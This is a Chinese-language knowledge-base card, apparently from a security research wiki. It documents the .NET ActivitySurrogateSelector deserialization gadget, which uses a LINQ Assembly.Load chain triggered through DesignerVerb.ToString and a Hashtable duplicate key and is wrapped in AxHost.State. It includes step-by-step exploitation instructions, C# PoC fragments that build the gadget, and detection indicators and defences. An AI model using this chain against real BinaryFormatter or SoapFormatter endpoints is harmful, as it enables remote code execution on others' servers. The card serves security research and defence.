---
id: web-dotnet-deser-activitysurrogateselector-linq-assembly-load-gadget
title: ActivitySurrogateSelector + LINQ 延迟执行 gadget：ObjectSerializedRef 包装任意类型，PagedDataSource/AggregateDictionary/DesignerVerb 串联到 Assembly.Load/Activator.CreateInstance
type: scenario
domain: web
path: web/dotnet/deserialization
technique: activitysurrogateselector-linq-assembly-load-gadget
aliases:
- ActivitySurrogateSelector gadget
- SoapFormatter ActivitySurrogateSelector
- ObjectSerializedRef
- LINQ 延迟执行 gadget
- PagedDataSource AggregateDictionary DesignerVerb
- Hashtable 重复键 ToString
- AxHost.State PropertyBagBinary
- Assembly.Load Activator.CreateInstance
tags:
- dotnet
- deserialization
- soapformatter
- binaryformatter
- activitysurrogateselector
- linq
- gadget
- assembly-load
- axhost
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V657
  verified_at: '2026-11-13T06:41:39+08:00'
  notes: 已对照原文与 26 张截图逐项核对 ObjectSerializedRef/GetObjectData、PagedDataSource→AggregateDictionary→DesignerVerb、Hashtable 重复键 String.Format 触发、AxHost.State/PropertyBagBinary 二层封装与 Pwned 弹窗验证；修正 Hashtable 触发条件表述为 hashcode 相同且 KeyEquals 命中，与原文/截图一致；与 disable-typecheck-bypass 卡为前后置边界，卡内已写明；未执行文中 C# 代码
---

## 一句话结论

`ActivitySurrogateSelector.ObjectSurrogate` 能在序列化时把任意不可序列化对象改写成 `[Serializable]` 的 `ObjectSerializedRef`（记录 type 与 memberDatas），因此可以把一条延迟执行的 LINQ 链 `byte[] → Select(Assembly.Load) → SelectMany(Assembly.GetTypes) → Select(Activator.CreateInstance)` 塞进序列化图；反序列化时用 `PagedDataSource`/`AggregateDictionary`/`DesignerVerb` 把 `ToString()` 转成对 `IEnumerable` 的枚举，并用 `Hashtable` 重复键异常里的 `String.Format(values)` 自动触发该 `ToString`，最终加载任意程序集并实例化其中的类型，在 SoapFormatter/BinaryFormatter 反序列化入口实现代码执行。

## 原理

- **SurrogateSelector 机制**：`SurrogateSelector` 为类型选择 `ISerializationSurrogate`；序列化时调用代理的 `GetObjectData(obj, info, ctx)` 把字段写进 `SerializationInfo`，反序列化时调用 `SetObjectData` 还原。若序列化用了代理而反序列化走原生流程，`ObjectReader.CheckSerializable` 会因目标类型不可序列化且当前 selector 无对应代理而抛 `SerializationException`。
- **ObjectSurrogate 的"洗白"作用**：`ActivitySurrogateSelector+ObjectSurrogate.GetObjectData` 在 `DisableActivitySurrogateSelectorTypeCheck=true` 时执行：
  - `info.AddValue("type", obj.GetType())` 记录原始类型；
  - `FormatterServices.GetObjectData(obj, members)` 取字段值并 `info.AddValue("memberDatas", objectData)`；
  - `info.SetType(typeof(ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef))`。
  `ObjectSerializedRef` 是 `[Serializable]` 且实现 `IObjectReference`/`IDeserializationCallback`，反序列化时按其 `type` + `memberDatas` 还原出原对象——于是任何"不可序列化"的类都能进入序列化图，成为 gadget 素材。
- **LINQ 延迟执行承载代码执行**：构造 `List<byte[]>` 放入恶意 DLL 字节，`bytesFile.Select(Assembly.Load)` 得到 `IEnumerable<Assembly>`；用 `Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"))` 把实例方法 `GetTypes` 绑成委托，`SelectMany` 展平成 `IEnumerable<Type>`；再 `Select(Activator.CreateInstance)` 得到"实例化每个类型"的延迟序列。LINQ 只有在枚举时才真正执行 `Assembly.Load`/`GetTypes`/`Activator.CreateInstance`（类型静态构造/实例构造即执行恶意代码）。
- **把 ToString 接到 IEnumerable**：James Forshaw 的转换链是 `Enumerable → PagedDataSource → ICollection`、`ICollection → AggregateDictionary → IDictionary`、`IDictionary → DesignerVerb → ToString`：
  - `PagedDataSource { DataSource = e3 }`：`System.Web.UI.WebControls.PagedDataSource` 实现 `ICollection` 且 DataSource 为 `IEnumerable`，枚举它即枚举 LINQ 链；
  - `AggregateDictionary`（internal，需反射 `Activator.CreateInstance`）实现 `IDictionary`，构造参数接收 `ICollection`；
  - `DesignerVerb`（`System.ComponentModel.Design`）的 `ToString()` 读 `Properties["Text"]`，即枚举其 `MenuCommand.Properties`（IDictionary）；用反射把 `MenuCommand.properties` 字段设为 `AggregateDictionary` 后，`ToString()` 会遍历字典 → 枚举 `PagedDataSource` → 执行 LINQ 链。
- **反序列化时自动触发 ToString**：`Hashtable.Insert` 在处理冲突时会比较 key，若两个 bucket 的 hashcode 相同且 `KeyEquals` 命中（攻击者用同一 `DesignerVerb` 对象替换某个 string key，即构成重复键）则抛 `ArgumentException(Environment.GetResourceString("Argument_AddingDuplicate__", key, key))`；`GetResourceString(key, values)` 内部 `String.Format(values)` 会把 `values` 中的每个对象 `ToString()`。攻击者先在 Hashtable 放入 `DesignerVerb` 键，再反射把 buckets 中某个 string key 替换为同一 `DesignerVerb`，制造重复键，即可在反序列化重建哈希表时触发。
- **外层投递封装**：`PayloadClass.GetObjectData` 设置 `info.SetType(typeof(System.Windows.Forms.AxHost.State))` 并 `AddValue("PropertyBagBinary", gadgetBytes())`；`AxHost.State` 的反序列化构造会遍历 SerializationInfo，对 `PropertyBagBinary` 调用 `PropertyBagStream.Read` → 内层 `BinaryFormatter.Deserialize`，用 try/catch 吞掉后续异常，保证代码执行后不易暴露。
- **SoapFormatter 与 BinaryFormatter**：两者都支持 `SurrogateSelector` 与上述 `SerializationInfo`/`ObjectSerializedRef` 语义；文章先用 SoapFormatter 演示代理机制，最终 gadget 以 BinaryFormatter 落盘，同一 gadget 亦可由 SoapFormatter 承载。

## 触发条件

- 存在 `SoapFormatter.Deserialize` 或 `BinaryFormatter.Deserialize` 等 .NET 原生反序列化入口，且攻击者可控制序列化流。
- 目标 .NET Framework 具备 `System.Workflow.ComponentModel`（ActivitySurrogateSelector）、`System.Web`（PagedDataSource）、`System.Windows.Forms`（AxHost.State）、`System.ComponentModel.Design` 等程序集（Framework 默认安装）。
- .NET 4.8 等版本需先关闭 `disableActivitySurrogateSelectorTypeCheck`（可在同一进程先执行辅助 gadget，见关联卡）。
- 反序列化端未做类型白名单/`SerializationBinder` 限制，或可绕过。

## 利用步骤

1. 确认反序列化入口与 .NET 运行时版本；确认 `ActivitySurrogateSelector` 类型检查状态。
2. 准备恶意程序集（如 ysoserial 的 ExploitClass.dll / 任意含静态构造或实例构造的 DLL）。
3. 在生成端构造 gadget：
   - `e1 = bytesFile.Select(Assembly.Load)`；
   - `e2 = e1.SelectMany((Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes")))`；
   - `e3 = e2.Select(Activator.CreateInstance)`；
   - `pds = new PagedDataSource { DataSource = e3 }`；
   - `dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds)`；
   - `verb = new DesignerVerb("XYZ", null)`；反射 `MenuCommand.properties` 设为 `dict`；
   - 构建 `Hashtable`，加入 `verb` 键与 dummy 键，反射把 buckets 中的 string key 替换成 `verb`（制造重复 hashcode）。
4. 将上述对象加入 `List<object>`，用 `BinaryFormatter` + 自定义 `MySurrogateSelector`（对不可序列化类型返回 `ActivitySurrogateSelector+ObjectSurrogate`）序列化。
5. 通过 `PayloadClass`/`AxHost.State` 的二层封装把 gadget 字节嵌入外层序列化流；设置 `AppSettings` 关闭类型检查后投递。
6. 反序列化端重建 Hashtable → 抛重复键异常 → `String.Format` 调 `DesignerVerb.ToString` → 枚举 LINQ → `Assembly.Load`/`Activator.CreateInstance` → 恶意程序集代码执行。

## PoC

```csharp
// 关键片段（节选）：LINQ 链 + 触发链构造
var e1 = bytesFile.Select(Assembly.Load);
Func<Assembly, IEnumerable<Type>> mapType = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(
    typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
var e2 = e1.SelectMany(mapType);
var e3 = e2.Select(Activator.CreateInstance);

PagedDataSource pds = new PagedDataSource { DataSource = e3 };
IDictionary dict = (IDictionary)Activator.CreateInstance(
    typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

DesignerVerb verb = new DesignerVerb("XYZ", null);
typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

Hashtable ht = new Hashtable();
ht.Add(verb, "Hello"); ht.Add("Dummy", "Hello2");
// 反射把 buckets 中的 string key 替换为 verb，制造重复 hashcode
```

```csharp
// 外层：AxHost.State 承载内层 BinaryFormatter 流
public void GetObjectData(SerializationInfo info, StreamingContext context) {
    info.SetType(typeof(System.Windows.Forms.AxHost.State));
    info.AddValue("PropertyBagBinary", GadgetChains());
}
```

说明：生成/投递需自定义 `SurrogateSelector`，并在 .NET 4.8 上先关闭 `DisableActivitySurrogateSelectorTypeCheck`；原文以弹出 Pwned 消息框验证程序集执行。

## 变体与关联

- 变体：soap 流与 binary 流均可承载；`ObjectSerializedRef` 可包装任意不可序列化类型，不限于 LINQ。
- 变体：`AxHost.State` 的 `PropertyBagBinary` 内层流可换成其它嵌套反序列化载体；也可用 `TextFormattingRunProperties`/`ObjectDataProvider` 先关闭类型检查。
- 关联：[[web-dotnet-deser-activitysurrogateselector-disable-typecheck-bypass]]（.NET 4.8 类型检查绕过，二者的前后置关系）、[[web-dotnet-deser-viewstate-machinekey-textformattingrunproperties]]（ViewState + TextFormattingRunProperties gadget）、[[web-dotnet-deser-transactionmanager-reenlist-binaryformatter-rce]]（另一条 BinaryFormatter gadget）。

## 检测与防御

- 检测：序列化流中出现 `ActivitySurrogateSelector`、`ObjectSerializedRef`、`PagedDataSource`、`AggregateDictionary`、`DesignerVerb`、`PropertyBagBinary`、`AxHost+State` 等类型名；进程内 `Assembly.Load` 后短时间内 `Activator.CreateInstance`；`Hashtable` 重复键异常伴随 `String.Format`/`ToString` 调用栈。
- 防御：禁用 `BinaryFormatter`/`SoapFormatter`（AppContext 开关或代码移除），改用安全序列化格式；对反序列化入口实施 `SerializationBinder`/类型白名单；保持 `ActivitySurrogateSelectorTypeCheck` 开启并升级框架；最小化 `System.Workflow` 等遗留程序集的可用性。
